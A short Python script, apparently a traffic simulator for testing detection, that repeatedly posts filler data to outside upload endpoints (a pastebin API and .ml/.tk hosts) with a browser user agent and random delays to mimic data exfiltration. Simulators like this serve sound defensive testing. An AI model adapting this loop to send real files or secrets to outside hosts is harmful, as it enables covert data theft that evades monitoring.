#!/usr/bin/env python3
"""
Data Exfiltration Simulator
Simulates large data transfers to external servers
"""

import time
import requests
import random

def run_data_exfil(is_running):
    """Simulate data exfiltration"""
    print("Starting Data Exfiltration simulation...")

    exfil_servers = [
        "http://pastebin.com/api/upload",
        "http://external-storage.ml/upload",
        "http://file-share-service.tk/upload",
    ]

    while is_running():
        try:
            server = random.choice(exfil_servers)

            # Generate fake data payload
            payload_size = random.randint(1024, 10240)  # 1-10 KB
            fake_data = 'A' * payload_size

            print(f"[EXFIL] Uploading {payload_size} bytes to {server}")

            try:
                requests.post(
                    server,
                    data={"data": fake_data},
                    timeout=5,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                )
            except:
                pass

            time.sleep(random.uniform(60, 180))

        except Exception as e:
            print(f"[EXFIL] Error: {e}")
            time.sleep(10)

    print("Data Exfiltration simulation stopped")
